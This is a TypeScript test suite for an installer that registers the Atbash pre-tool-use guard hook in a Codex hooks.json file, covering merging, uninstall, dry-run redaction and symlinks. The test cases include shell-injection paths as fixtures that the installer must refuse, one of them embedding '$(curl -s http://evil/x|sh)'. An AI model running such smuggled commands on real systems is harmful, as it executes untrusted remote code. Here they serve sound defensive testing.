/**
 * The user-level hook installer, driven against real files in os.tmpdir() through node's fs API
 * (never a shell: the workspace guard refuses shell writes to any file named hooks.json, and the
 * installer is the product under test, not a shell). No mocks: the library is exercised on real
 * temporary directories, and the BUILT installer (dist and the committed runtime) is spawned as
 * a user would run it. Where a case is OS-specific (symlink kinds, mode bits) each OS asserts the
 * behaviour that applies to it; nothing is skipped.
 */
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import {
  chmodSync,
  copyFileSync,
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  realpathSync,
  rmSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { isAbsolute, join, resolve, sep } from "node:path";
import test from "node:test";

import {
  EXIT_OK,
  EXIT_REFUSED,
  EXIT_USAGE,
  installHook,
  parseArgs,
  resolveHooksPath,
  runInstallHookCli,
  type InstallContext,
  type InstallHookOptions,
} from "../src/install-hook/cli.js";
import {
  HOOK_MATCHER,
  HOOK_STATUS_MESSAGE,
  HOOK_TIMEOUT_SECONDS,
  HooksFileRefusal,
  buildAtbashEntry,
  commandScriptPath,
  directoryWritableByOthers,
  isAtbashHook,
  parseHookCommand,
  resolveInterpreter,
  resolveWriteTarget,
  validateHookScriptPath,
  verifyEntryRoundTrip,
  writeHooksFileAtomically,
  type AtbashIdentity,
} from "../src/install-hook/hooks-file.js";

// dist-tests/tests -> plugins/atbash/runtime: the committed runtime, where the installer ships.
const RUNTIME_DIR = resolve(process.cwd(), "runtime");
const REAL_HOOK_SCRIPT = realpathSync(join(RUNTIME_DIR, "pre-tool-use.cjs"));
const WIN32 = process.platform === "win32";
// What the registered command carries: the realpath as it is, forward slashes on Windows only.
const COMMAND_PATH = WIN32 ? REAL_HOOK_SCRIPT.replaceAll("\\", "/") : REAL_HOOK_SCRIPT;
// The interpreter the installer embeds: the node running these tests, resolved like the hook.
const NODE_PATH = realpathSync(process.execPath);
const NODE_COMMAND = WIN32 ? NODE_PATH.replaceAll("\\", "/") : NODE_PATH;
const OWN_COMMAND = `"${NODE_COMMAND}" "${COMMAND_PATH}"`;
// Plain interpreter paths for the pure (platform-parameterised) cases.
const POSIX_NODE = "/usr/local/bin/node";
const WIN32_NODE = "C:\\Program Files\\nodejs\\node.exe";
const nodeFor = (platform: NodeJS.Platform) => (platform === "win32" ? WIN32_NODE : POSIX_NODE);
const IDENTITY: AtbashIdentity = { hookScript: REAL_HOOK_SCRIPT, platform: process.platform };

interface HookShape {
  type?: unknown;
  command?: unknown;
  commandWindows?: unknown;
  timeout?: unknown;
  statusMessage?: unknown;
}

interface GroupShape {
  matcher?: unknown;
  hooks?: HookShape[];
}

interface DocumentShape {
  hooks?: { PreToolUse?: GroupShape[]; [event: string]: unknown };
  [key: string]: unknown;
}

const FOREIGN_GROUP: GroupShape = {
  matcher: "Bash",
  hooks: [{ type: "command", command: "node /opt/other/guard.js", timeout: 5 }],
};

function tempHome(): string {
  return mkdtempSync(join(tmpdir(), "atbash-install-hook-"));
}

function options(overrides: Partial<InstallHookOptions> = {}): InstallHookOptions {
  return { scope: "user", dryRun: false, uninstall: false, help: false, ...overrides };
}

function context(home: string, overrides: Partial<InstallContext> = {}): InstallContext {
  // HOME and CODEX_HOME are never read from the real environment: every path is inside `home`.
  return {
    cwd: home,
    env: {},
    home,
    runtimeDir: RUNTIME_DIR,
    platform: process.platform,
    nodePath: process.execPath,
    ...overrides,
  };
}

function readDocument(path: string): DocumentShape {
  return JSON.parse(readFileSync(path, "utf8")) as DocumentShape;
}

function atbashGroups(document: DocumentShape): GroupShape[] {
  return (document.hooks?.PreToolUse ?? []).filter((group) =>
    (group.hooks ?? []).some((hook) => isAtbashHook(hook, IDENTITY)),
  );
}

function assertAtbashHook(hook: HookShape | undefined): void {
  assert.ok(hook, "no Atbash hook");
  assert.equal(hook.type, "command");
  assert.equal(hook.command, OWN_COMMAND);
  assert.equal(hook.timeout, HOOK_TIMEOUT_SECONDS);
  assert.equal(hook.statusMessage, HOOK_STATUS_MESSAGE);
  if (WIN32) {
    assert.equal(
      hook.commandWindows,
      `"${NODE_COMMAND.replaceAll("/", "\\")}" "${COMMAND_PATH.replaceAll("/", "\\")}"`,
    );
  } else {
    assert.equal(hook.commandWindows, undefined, "commandWindows is a Windows-only key");
  }
}

function runCli(
  argv: string[],
  ctx: InstallContext,
): { code: number; stdout: string; stderr: string } {
  const stdout: string[] = [];
  const stderr: string[] = [];
  const code = runInstallHookCli(argv, ctx, {
    stdout: (text) => stdout.push(text),
    stderr: (text) => stderr.push(text),
  });
  return { code, stdout: stdout.join(""), stderr: stderr.join("") };
}

test("install-hook: the entry names the plugin's real absolute hook path, forward slashes and a Windows variant on win32 only", () => {
  assert.ok(resolve(REAL_HOOK_SCRIPT) === REAL_HOOK_SCRIPT, "realpath must be absolute");
  assert.match(REAL_HOOK_SCRIPT, /[\\/]runtime[\\/]pre-tool-use\.cjs$/);

  // POSIX: the path is used as it is - no rewrite, because a backslash there is not a separator.
  const posix = buildAtbashEntry("/home/dev/atbash/runtime/pre-tool-use.cjs", "linux", POSIX_NODE);
  assert.deepEqual(posix, {
    matcher: HOOK_MATCHER,
    hooks: [
      {
        type: "command",
        command: '"/usr/local/bin/node" "/home/dev/atbash/runtime/pre-tool-use.cjs"',
        timeout: HOOK_TIMEOUT_SECONDS,
        statusMessage: HOOK_STATUS_MESSAGE,
      },
    ],
  });

  // Windows: forward slashes in `command`, the backslash spelling in `commandWindows`.
  const windows = buildAtbashEntry(
    "C:\\Users\\dev\\New folder (3)\\runtime\\pre-tool-use.cjs",
    "win32",
    WIN32_NODE,
  );
  assert.deepEqual(windows.hooks[0], {
    type: "command",
    command:
      '"C:/Program Files/nodejs/node.exe" "C:/Users/dev/New folder (3)/runtime/pre-tool-use.cjs"',
    commandWindows:
      '"C:\\Program Files\\nodejs\\node.exe" "C:\\Users\\dev\\New folder (3)\\runtime\\pre-tool-use.cjs"',
    timeout: HOOK_TIMEOUT_SECONDS,
    statusMessage: HOOK_STATUS_MESSAGE,
  });

  // The Atbash signal: the status message, or a command naming this very hook script (with or
  // without trailing arguments). A command that merely runs some pre-tool-use.cjs is not ours.
  assert.equal(isAtbashHook(windows.hooks[0], IDENTITY), true, "status message");
  assert.equal(
    isAtbashHook(
      {
        command: 'node "$PLUGIN_ROOT/runtime/pre-tool-use.cjs"',
        statusMessage: HOOK_STATUS_MESSAGE,
      },
      IDENTITY,
    ),
    true,
    "hooks.json placeholder form, marked",
  );
  assert.equal(
    isAtbashHook({ command: 'node "$PLUGIN_ROOT/runtime/pre-tool-use.cjs"' }, IDENTITY),
    false,
    "placeholder form without the status message is not provably ours",
  );
  assert.equal(isAtbashHook({ command: OWN_COMMAND }, IDENTITY), true, "own path");
  assert.equal(
    isAtbashHook({ command: `node "${COMMAND_PATH}"` }, IDENTITY),
    true,
    "own path behind a bare node (hand-edited)",
  );
  assert.equal(
    isAtbashHook({ command: `${OWN_COMMAND} --verbose` }, IDENTITY),
    true,
    "own path with trailing arguments",
  );
  assert.equal(
    isAtbashHook({ commandWindows: `node "${REAL_HOOK_SCRIPT}"` }, IDENTITY),
    true,
    "own path in the Windows spelling",
  );
  const otherCase = { command: `node "${REAL_HOOK_SCRIPT.toUpperCase()}"` };
  assert.equal(isAtbashHook(otherCase, IDENTITY), WIN32, "case folds on Windows only");
  assert.equal(
    isAtbashHook({ command: 'node "/opt/other-vendor/hooks/pre-tool-use.cjs"' }, IDENTITY),
    false,
    "another vendor's pre-tool-use.cjs",
  );
  assert.equal(isAtbashHook(FOREIGN_GROUP.hooks?.[0], IDENTITY), false);
  assert.equal(isAtbashHook({ command: "echo atbash pre-tool-use.cjs is great" }, IDENTITY), false);
  assert.equal(isAtbashHook("node pre-tool-use.cjs", IDENTITY), false);
  assert.equal(isAtbashHook(null, IDENTITY), false);

  assert.equal(commandScriptPath('node "/a b/c.cjs" --x'), "/a b/c.cjs");
  assert.deepEqual(parseHookCommand('"/usr/bin/node" "/a b/c.cjs" --x'), {
    interpreter: "/usr/bin/node",
    script: "/a b/c.cjs",
  });
  assert.deepEqual(parseHookCommand('node "/a/c.cjs"'), {
    interpreter: undefined,
    script: "/a/c.cjs",
  });
  assert.equal(commandScriptPath("node /a/c.cjs"), undefined, "an unquoted path is not parsed");
  assert.equal(commandScriptPath('python "/a/c.cjs"'), undefined);
  assert.equal(commandScriptPath('"/usr/bin/node" /a/c.cjs'), undefined);
});

test("install-hook: a hook path containing shell metacharacters or a backslash on POSIX is refused, nothing written", () => {
  // The command is a shell string; the path is allowlisted, never escaped.
  for (const bad of [
    "/home/u/$(curl -s http://evil/x|sh)/runtime/pre-tool-use.cjs",
    "/home/u/`id`/runtime/pre-tool-use.cjs",
    "/home/u/a;b/runtime/pre-tool-use.cjs",
    "/home/u/a&b/runtime/pre-tool-use.cjs",
    "/home/u/a|b/runtime/pre-tool-use.cjs",
    "/home/u/a'b/runtime/pre-tool-use.cjs",
    '/home/u/a"b/runtime/pre-tool-use.cjs',
    "/home/u/a\nb/runtime/pre-tool-use.cjs",
    "/home/u/a~b/runtime/pre-tool-use.cjs",
    "/home/u/a*b/runtime/pre-tool-use.cjs",
    "C:\\u\\%USERPROFILE%\\runtime\\pre-tool-use.cjs",
    "C:\\u\\a!b\\runtime\\pre-tool-use.cjs",
    "C:\\u\\a^b\\runtime\\pre-tool-use.cjs",
  ]) {
    for (const platform of ["linux", "darwin", "win32"] as const) {
      assert.throws(
        () => buildAtbashEntry(bad, platform, nodeFor(platform)),
        (error: unknown) =>
          error instanceof HooksFileRefusal &&
          /move the plugin to a plain path/.test(error.message),
        `${platform}: ${bad}`,
      );
    }
  }
  // A backslash is a separator on Windows and refused on POSIX (rewriting it would register a
  // path that does not exist: fail open at the host).
  assert.throws(
    () => buildAtbashEntry("/home/dev/a\\b/runtime/pre-tool-use.cjs", "linux", POSIX_NODE),
    /move the plugin to a plain path/,
  );
  // The interpreter goes into the same shell string and is held to the same allowlist.
  for (const badNode of ["/home/u/$(id)/bin/node", "/home/u/`id`/bin/node", "/home/u/a\\b/node"]) {
    assert.throws(
      () => buildAtbashEntry("/home/dev/x/runtime/pre-tool-use.cjs", "linux", badNode),
      /node interpreter path .* a character a shell could interpret/,
      badNode,
    );
  }
  assert.throws(
    () => resolveInterpreter("node", process.platform),
    /not an existing absolute path/,
    "a bare node is never registered",
  );
  assert.throws(
    () => resolveInterpreter(join(tmpdir(), "no-such-node"), process.platform),
    /not an existing absolute path/,
  );
  assert.equal(resolveInterpreter(process.execPath, process.platform), NODE_PATH);
  validateHookScriptPath("C:\\Users\\dev\\New folder (3)\\runtime\\pre-tool-use.cjs", "win32");
  validateHookScriptPath("/home/dev/a-b_c.d (1)+@:x/runtime/pre-tool-use.cjs", "linux");
  assert.equal(
    buildAtbashEntry("/home/dev/x/runtime/pre-tool-use.cjs", "linux", POSIX_NODE).hooks[0]?.command,
    '"/usr/local/bin/node" "/home/dev/x/runtime/pre-tool-use.cjs"',
  );
  assert.equal(
    buildAtbashEntry("C:\\x\\runtime\\pre-tool-use.cjs", "win32", WIN32_NODE).hooks[0]?.command,
    '"C:/Program Files/nodejs/node.exe" "C:/x/runtime/pre-tool-use.cjs"',
  );

  // Real plugin directories whose names a shell would interpret: the installer that lives there
  // refuses, and the hooks file is not created.
  const home = tempHome();
  try {
    const names = ["plug$(id)", "plug`id`"];
    if (!WIN32) names.push("plug\\back");
    for (const name of names) {
      const pluginDir = join(home, name);
      mkdirSync(pluginDir);
      copyFileSync(join(RUNTIME_DIR, "pre-tool-use.cjs"), join(pluginDir, "pre-tool-use.cjs"));
      const result = runCli([], context(home, { runtimeDir: pluginDir }));
      assert.equal(result.code, EXIT_REFUSED, name);
      assert.match(result.stderr, /^Refused: .*move the plugin to a plain path/, name);
      assert.match(result.stderr, /Nothing was written/, name);
      assert.equal(existsSync(join(home, ".codex")), false, name);
    }
  } finally {
    rmSync(home, { force: true, recursive: true });
  }
});

test("install-hook: fresh install writes a documented-shape file whose command resolves back to the hook, then a re-run is idempotent", () => {
  const home = tempHome();
  try {
    const hooksPath = join(home, ".codex", "hooks.json");
    assert.equal(existsSync(hooksPath), false);

    const first = installHook(options(), context(home));
    assert.equal(first.action, "installed");
    assert.equal(first.written, true);
    assert.equal(first.hooksPath, hooksPath);
    assert.equal(first.target, hooksPath);
    assert.equal(first.hookScript, REAL_HOOK_SCRIPT);
    assert.equal(first.interpreter, NODE_PATH);
    assert.deepEqual(first.kept, { foreignHooks: 0, otherEvents: 0 });
    assert.deepEqual(first.notes, []);

    const text = readFileSync(hooksPath, "utf8");
    assert.equal(text, first.text);
    assert.match(text, /\n$/, "the file ends with a newline");
    const document = readDocument(hooksPath);
    assert.deepEqual(Object.keys(document), ["hooks"]);
    assert.deepEqual(Object.keys(document.hooks ?? {}), ["PreToolUse"]);
    const groups = document.hooks?.PreToolUse ?? [];
    assert.equal(groups.length, 1);
    assert.equal(groups[0]?.matcher, "*");
    assert.equal(groups[0]?.hooks?.length, 1);
    const hook = groups[0]?.hooks?.[0];
    assertAtbashHook(hook);
    // Round trip: the paths parsed back out of the written command are the sibling hook script
    // and the node that ran the installer, both existing and absolute.
    for (const command of [hook?.command, hook?.commandWindows]) {
      if (command === undefined) continue;
      const registered = parseHookCommand(command);
      assert.ok(registered, `unparseable command ${String(command)}`);
      assert.equal(existsSync(registered.script), true, registered.script);
      assert.equal(realpathSync(registered.script), REAL_HOOK_SCRIPT);
      assert.ok(registered.interpreter, "no interpreter");
      assert.equal(isAbsolute(registered.interpreter), true);
      assert.equal(existsSync(registered.interpreter), true, registered.interpreter);
      assert.equal(realpathSync(registered.interpreter), NODE_PATH);
    }
    if (!WIN32) {
      assert.equal(statSync(hooksPath).mode & 0o777, 0o600, "private mode on POSIX");
    }
    // The temp file was renamed away, not left behind.
    assert.deepEqual(readdirSync(join(home, ".codex")), ["hooks.json"]);

    const again = installHook(options(), context(home));
    assert.equal(again.action, "unchanged");
    assert.equal(again.written, false);
    assert.equal(readFileSync(hooksPath, "utf8"), text);
    assert.equal(atbashGroups(readDocument(hooksPath)).length, 1, "never duplicated");

    // The round-trip check itself: a command that names another file, a missing file, or no
    // parseable path is refused before anything is written.
    const ok = buildAtbashEntry(REAL_HOOK_SCRIPT, process.platform, NODE_PATH);
    verifyEntryRoundTrip(ok, REAL_HOOK_SCRIPT, NODE_PATH);
    const other = join(home, "other.cjs");
    writeFileSync(other, "");
    const cmd = (script: string, interpreter = NODE_COMMAND) => `"${interpreter}" "${script}"`;
    const [own] = ok.hooks;
    assert.ok(own);
    const tamper = (command: string) => ({
      ...ok,
      hooks: [{ ...own, command, ...(WIN32 ? { commandWindows: command } : {}) }],
    });
    const verify = (command: string) =>
      verifyEntryRoundTrip(tamper(command), REAL_HOOK_SCRIPT, NODE_PATH);
    assert.throws(() => verify(cmd(other)), /resolves to .*other\.cjs, not to/);
    assert.throws(() => verify(cmd(join(home, "missing.cjs"))), /names a file that does not exist/);
    assert.throws(() => verify(`node ${REAL_HOOK_SCRIPT}`), /does not parse back to a script path/);
    assert.throws(
      () => verify(`node "${COMMAND_PATH}"`),
      /does not name an absolute interpreter/,
      "a bare node is not what the installer writes",
    );
    assert.throws(
      () => verify(cmd(COMMAND_PATH, join(home, "missing-node"))),
      /names an interpreter that does not exist/,
    );
    assert.throws(
      () => verify(cmd(COMMAND_PATH, other)),
      /the interpreter resolves to .*other\.cjs, not to/,
    );
  } finally {
    rmSync(home, { force: true, recursive: true });
  }
});

test("install-hook: merges beside a foreign entry and other events, replacing a stale Atbash entry", () => {
  const home = tempHome();
  try {
    const hooksPath = join(home, ".codex", "hooks.json");
    mkdirSync(join(home, ".codex"), { recursive: true });
    // The plugin moved: the old entry still carries the Atbash status message.
    const stale = {
      matcher: "*",
      hooks: [
        {
          type: "command",
          command: 'node "/old/place/runtime/pre-tool-use.cjs"',
          timeout: 35,
          statusMessage: HOOK_STATUS_MESSAGE,
        },
      ],
    };
    writeFileSync(
      hooksPath,
      JSON.stringify(
        {
          description: "my hooks",
          hooks: {
            PostToolUse: [{ matcher: "Bash", hooks: [{ type: "command", command: "echo done" }] }],
            PreToolUse: [stale, FOREIGN_GROUP],
          },
          extra: { keep: true },
        },
        null,
        2,
      ),
    );

    const result = installHook(options(), context(home));
    assert.equal(result.action, "updated");
    assert.equal(result.written, true);
    assert.deepEqual(result.kept, { foreignHooks: 1, otherEvents: 1 });

    const document = readDocument(hooksPath);
    assert.equal(document.description, "my hooks");
    assert.deepEqual(document.extra, { keep: true });
    assert.deepEqual(document.hooks?.PostToolUse, [
      { matcher: "Bash", hooks: [{ type: "command", command: "echo done" }] },
    ]);
    const groups = document.hooks?.PreToolUse ?? [];
    assert.equal(groups.length, 2, "foreign entry kept, stale Atbash entry replaced not appended");
    assert.deepEqual(groups[0], FOREIGN_GROUP);
    assertAtbashHook(groups[1]?.hooks?.[0]);
    assert.equal(JSON.stringify(document).includes("/old/place/"), false, "the stale path is gone");

    // A hand-edited group that mixes the Atbash hook with a foreign hook: only the Atbash hook
    // leaves that group; the foreign hook stays where it was.
    const mixed = {
      matcher: "*",
      hooks: [
        { type: "command", command: "node /opt/other/first.js" },
        {
          type: "command",
          command: 'node "/old/place/runtime/pre-tool-use.cjs"',
          statusMessage: HOOK_STATUS_MESSAGE,
        },
      ],
    };
    writeFileSync(hooksPath, JSON.stringify({ hooks: { PreToolUse: [mixed] } }));
    assert.equal(installHook(options(), context(home)).action, "updated");
    const afterMixed = readDocument(hooksPath).hooks?.PreToolUse ?? [];
    assert.equal(afterMixed.length, 2);
    assert.deepEqual(afterMixed[0], {
      matcher: "*",
      hooks: [{ type: "command", command: "node /opt/other/first.js" }],
    });
    assertAtbashHook(afterMixed[1]?.hooks?.[0]);
  } finally {
    rmSync(home, { force: true, recursive: true });
  }
});

test("install-hook: a foreign pre-tool-use.cjs hook is neither replaced nor removed; an own-path entry with arguments is replaced, not duplicated", () => {
  const home = tempHome();
  try {
    const hooksPath = join(home, ".codex", "hooks.json");
    mkdirSync(join(home, ".codex"), { recursive: true });
    const vendor = {
      matcher: "*",
      hooks: [
        {
          type: "command",
          command: 'node "/opt/other-vendor/hooks/pre-tool-use.cjs"',
          timeout: 10,
        },
      ],
    };
    writeFileSync(hooksPath, JSON.stringify({ hooks: { PreToolUse: [vendor] } }));

    const install = runCli([], context(home));
    assert.equal(install.code, EXIT_OK, install.stderr);
    assert.match(
      install.stderr,
      /^note: .*pre-tool-use\.cjs without the Atbash status message.*left alone/m,
    );
    let groups = readDocument(hooksPath).hooks?.PreToolUse ?? [];
    assert.equal(groups.length, 2);
    assert.deepEqual(groups[0], vendor, "the vendor's hook is untouched");
    assertAtbashHook(groups[1]?.hooks?.[0]);
    assert.match(install.stdout, /1 foreign PreToolUse hook and 0 other events kept/);

    const uninstall = runCli(["--uninstall"], context(home));
    assert.equal(uninstall.code, EXIT_OK, uninstall.stderr);
    assert.deepEqual(readDocument(hooksPath), { hooks: { PreToolUse: [vendor] } });
    assert.match(uninstall.stdout, /1 foreign PreToolUse hook and 0 other events kept/);

    // A hand-edited Atbash entry: own path, trailing argument, no status message. Recognised by
    // the path, so a re-run replaces it instead of appending a second one.
    const handEdited = {
      matcher: "*",
      hooks: [{ type: "command", command: `node "${COMMAND_PATH}" --verbose`, timeout: 35 }],
    };
    writeFileSync(hooksPath, JSON.stringify({ hooks: { PreToolUse: [vendor, handEdited] } }));
    const rerun = installHook(options(), context(home));
    assert.equal(rerun.action, "updated");
    groups = readDocument(hooksPath).hooks?.PreToolUse ?? [];
    assert.equal(groups.length, 2, "replaced, not duplicated");
    assert.deepEqual(groups[0], vendor);
    assertAtbashHook(groups[1]?.hooks?.[0]);
    assert.equal(atbashGroups(readDocument(hooksPath)).length, 1);
    assert.equal(JSON.stringify(groups).includes("--verbose"), false);
  } finally {
    rmSync(home, { force: true, recursive: true });
  }
});

test("install-hook: a malformed file, a non-object root, and a PreToolUse that is not an array are refused untouched", () => {
  const home = tempHome();
  try {
    const hooksPath = join(home, ".codex", "hooks.json");
    mkdirSync(join(home, ".codex"), { recursive: true });
    const cases: Array<[string, RegExp]> = [
      ['{"hooks": {"PreToolUse": [', /not valid JSON/],
      ["", /not valid JSON \(unexpected end of input\)/],
      ["[]", /JSON object at the top level/],
      ['{"hooks": []}', /"hooks" must be an object/],
      ['{"hooks": {"PreToolUse": {"matcher": "*"}}}', /"hooks\.PreToolUse" must be an array/],
      ['{"hooks": {"PreToolUse": ["node x"]}}', /PreToolUse\[0\]" must be an object/],
      [
        '{"hooks": {"PreToolUse": [{"matcher": "*", "hooks": {}}]}}',
        /PreToolUse\[0\]\.hooks" must be an array/,
      ],
    ];
    for (const [content, expected] of cases) {
      writeFileSync(hooksPath, content);
      const result = runCli([], context(home));
      assert.equal(result.code, EXIT_REFUSED, content);
      assert.match(result.stderr, /^Refused: /, content);
      assert.match(result.stderr, expected, content);
      assert.match(result.stderr, /Nothing was written/, content);
      assert.equal(readFileSync(hooksPath, "utf8"), content, `file changed for ${content}`);
      assert.deepEqual(readdirSync(join(home, ".codex")), ["hooks.json"], "no temp file left");

      // --uninstall is held to the same standard: a file it cannot read is not a file it edits.
      const uninstall = runCli(["--uninstall"], context(home));
      assert.equal(uninstall.code, EXIT_REFUSED, content);
      assert.equal(readFileSync(hooksPath, "utf8"), content);
    }
  } finally {
    rmSync(home, { force: true, recursive: true });
  }
});

test("install-hook: uninstall removes only the Atbash entry; a second uninstall is a no-op", () => {
  const home = tempHome();
  try {
    const hooksPath = join(home, ".codex", "hooks.json");
    mkdirSync(join(home, ".codex"), { recursive: true });
    writeFileSync(
      hooksPath,
      JSON.stringify({ hooks: { PreToolUse: [FOREIGN_GROUP], Stop: [{ hooks: [] }] } }),
    );
    assert.equal(installHook(options(), context(home)).action, "installed");
    assert.equal(atbashGroups(readDocument(hooksPath)).length, 1);

    const removed = installHook(options({ uninstall: true }), context(home));
    assert.equal(removed.action, "removed");
    assert.equal(removed.written, true);
    assert.equal(removed.entry, undefined);
    const document = readDocument(hooksPath);
    assert.deepEqual(document, { hooks: { PreToolUse: [FOREIGN_GROUP], Stop: [{ hooks: [] }] } });

    const again = installHook(options({ uninstall: true }), context(home));
    assert.equal(again.action, "not-installed");
    assert.equal(again.written, false);
    assert.deepEqual(readDocument(hooksPath), document);

    // Uninstalling the only entry drops the emptied PreToolUse key and keeps the rest of the file.
    writeFileSync(hooksPath, JSON.stringify({ note: "x", hooks: { Stop: [] } }));
    installHook(options(), context(home));
    installHook(options({ uninstall: true }), context(home));
    assert.deepEqual(readDocument(hooksPath), { note: "x", hooks: { Stop: [] } });

    // No file at all: nothing to remove, and nothing is created.
    rmSync(hooksPath);
    const absent = installHook(options({ uninstall: true }), context(home));
    assert.equal(absent.action, "not-installed");
    assert.equal(existsSync(hooksPath), false);
  } finally {
    rmSync(home, { force: true, recursive: true });
  }
});

test("install-hook: --dry-run prints only the Atbash entry and a count of what is kept, writes nothing, and never echoes file contents", () => {
  const home = tempHome();
  try {
    const hooksPath = join(home, ".codex", "hooks.json");
    const fresh = runCli(["--dry-run"], context(home));
    assert.equal(fresh.code, EXIT_OK, fresh.stderr);
    assert.equal(existsSync(hooksPath), false);
    assert.equal(existsSync(join(home, ".codex")), false, "not even the directory is created");
    assert.match(fresh.stdout, /Dry run: nothing was written/);
    const entry = installHook(options({ dryRun: true }), context(home)).entry;
    assert.ok(entry);
    assert.ok(fresh.stdout.includes(JSON.stringify(entry, null, 2)), "the exact entry is printed");
    assertAtbashHook(entry.hooks[0]);
    assert.match(
      fresh.stdout,
      /Would install .*0 foreign PreToolUse hooks and 0 other events kept/,
    );
    assert.match(fresh.stdout, /\/hooks/, "the trust step is named");
    assert.match(fresh.stdout, /Restart Codex/);

    // A foreign hook's command line may carry a secret: it is counted, never printed.
    mkdirSync(join(home, ".codex"), { recursive: true });
    const token = "tok_FOREIGN_SECRET_123";
    const before = JSON.stringify({
      hooks: {
        PreToolUse: [
          {
            matcher: "Bash",
            hooks: [{ type: "command", command: `node /opt/x --token ${token}` }],
          },
        ],
        PostToolUse: [
          { hooks: [{ type: "command", command: `curl -H "Authorization: ${token}" x` }] },
        ],
      },
    });
    writeFileSync(hooksPath, before);
    const dry = runCli(["--dry-run"], context(home));
    assert.equal(dry.code, EXIT_OK, dry.stderr);
    assert.equal(dry.stdout.includes(token), false, "a foreign command must not be echoed");
    assert.equal(dry.stderr.includes(token), false);
    assert.match(dry.stdout, /Would install .*1 foreign PreToolUse hook and 1 other event kept/);
    assert.equal(readFileSync(hooksPath, "utf8"), before, "dry run wrote nothing");
    const dryUninstall = runCli(["--dry-run", "--uninstall"], context(home));
    assert.equal(dryUninstall.code, EXIT_OK);
    assert.match(dryUninstall.stdout, /No Atbash hook .*nothing to remove/);
    assert.equal(readFileSync(hooksPath, "utf8"), before);

    // A parse error names a position, never the file's text (V8 quotes short inputs).
    for (const content of [
      `{not json "tok_LEAK_456"}`,
      `["tok_LEAK_789",]`,
      `{"a": 1, "b": "tok_LEAK_000"`,
    ]) {
      writeFileSync(hooksPath, content);
      const refused = runCli([], context(home));
      assert.equal(refused.code, EXIT_REFUSED, content);
      assert.match(refused.stderr, /not valid JSON \(syntax error/, content);
      assert.equal(/tok_LEAK/.test(refused.stderr), false, `leaked: ${refused.stderr}`);
      assert.equal(refused.stderr.includes(content), false, content);
    }
  } finally {
    rmSync(home, { force: true, recursive: true });
  }
});

test("install-hook: a symlinked hooks.json is updated through the link, and a file that changed underneath is left alone", () => {
  const home = tempHome();
  try {
    const real = join(home, "real");
    const link = join(home, "link");
    mkdirSync(real);
    const foreign = JSON.stringify({ hooks: { PreToolUse: [FOREIGN_GROUP] } });
    writeFileSync(join(real, "hooks.json"), foreign);
    const realFile = realpathSync(join(real, "hooks.json"));

    if (WIN32) {
      // A file symlink needs a privilege on Windows; a directory junction does not, and it is the
      // same realpath branch: the write lands on the real file behind the junctioned directory.
      symlinkSync(real, link, "junction");
      assert.equal(resolveWriteTarget(join(link, "hooks.json")), realFile);
      assert.equal(
        resolveWriteTarget(join(link, "new.json")),
        join(realpathSync(real), "new.json"),
      );
    } else {
      mkdirSync(link);
      symlinkSync(realFile, join(link, "hooks.json"));
      assert.equal(resolveWriteTarget(join(link, "hooks.json")), realFile);
      // A link to nothing is refused rather than replaced by a regular file.
      mkdirSync(join(home, "dangling"));
      symlinkSync(join(home, "nowhere.json"), join(home, "dangling", "hooks.json"));
      assert.throws(
        () => resolveWriteTarget(join(home, "dangling", "hooks.json")),
        /link to a file that does not exist/,
      );
      const refused = runCli(["--dir", join(home, "dangling")], context(home));
      assert.equal(refused.code, EXIT_REFUSED);
      assert.equal(lstatSync(join(home, "dangling", "hooks.json")).isSymbolicLink(), true);
    }

    const result = installHook(options({ dir: link }), context(home));
    assert.equal(result.action, "installed");
    assert.equal(result.hooksPath, join(link, "hooks.json"));
    assert.equal(result.target, realFile, "the real file is the write target");
    assert.equal(readFileSync(realFile, "utf8"), result.text, "updated through the link");
    assert.equal(readFileSync(join(link, "hooks.json"), "utf8"), result.text);
    if (!WIN32) {
      assert.equal(lstatSync(join(link, "hooks.json")).isSymbolicLink(), true, "link kept");
    }
    assert.deepEqual(readdirSync(real), ["hooks.json"], "temp file renamed away in the real dir");
    assert.equal(atbashGroups(readDocument(realFile)).length, 1);
    assert.deepEqual(readDocument(realFile).hooks?.PreToolUse?.[0], FOREIGN_GROUP);
    const cli = runCli(["--dir", link], context(home));
    assert.equal(cli.code, EXIT_OK, cli.stderr);
    assert.match(cli.stdout, /already installed/);
    assert.match(cli.stdout, /is a link; the file behind it/);

    // Compare-and-swap: the file is edited (by something else) between the read and the rename.
    const tampered = JSON.stringify({ hooks: { PreToolUse: [FOREIGN_GROUP] }, edited: true });
    assert.throws(
      () =>
        installHook(
          options({ uninstall: true, dir: link }),
          context(home, { beforeSwap: () => writeFileSync(realFile, tampered) }),
        ),
      (error: unknown) =>
        error instanceof HooksFileRefusal &&
        /changed while the installer was running/.test(error.message),
    );
    assert.equal(readFileSync(realFile, "utf8"), tampered, "the concurrent edit wins");
    assert.deepEqual(readdirSync(real), ["hooks.json"], "no temp file left behind");

    // The same guard for a file that appeared after the installer found none.
    const fresh = join(home, "fresh");
    mkdirSync(fresh);
    assert.throws(
      () =>
        writeHooksFileAtomically(join(fresh, "hooks.json"), "{}\n", {
          platform: process.platform,
          expectedExisting: undefined,
          beforeSwap: () => writeFileSync(join(fresh, "hooks.json"), "{}"),
        }),
      /changed while the installer was running/,
    );
    assert.equal(readFileSync(join(fresh, "hooks.json"), "utf8"), "{}");
    assert.deepEqual(readdirSync(fresh), ["hooks.json"]);
  } finally {
    rmSync(home, { force: true, recursive: true });
  }
});

test("install-hook: a hooks directory writable by others draws a warning on POSIX; Windows makes no mode check", () => {
  const home = tempHome();
  try {
    const dir = join(home, ".codex");
    mkdirSync(dir);
    assert.equal(
      directoryWritableByOthers(dir, "win32"),
      false,
      "never on Windows: ACLs, not modes",
    );
    assert.equal(directoryWritableByOthers(join(home, "missing"), "linux"), false);
    if (WIN32) {
      // stat reports mode bits on Windows too, but they are not the permission model: the POSIX
      // branch reads them (a real stat), the win32 branch ignores them, and the CLI warns on none.
      assert.equal(directoryWritableByOthers(dir, "linux"), (statSync(dir).mode & 0o022) !== 0);
      const result = runCli([], context(home));
      assert.equal(result.code, EXIT_OK, result.stderr);
      assert.doesNotMatch(result.stderr, /^warning:/m);
    } else {
      chmodSync(dir, 0o700);
      assert.equal(directoryWritableByOthers(dir, process.platform), false);
      const quiet = runCli([], context(home));
      assert.equal(quiet.code, EXIT_OK, quiet.stderr);
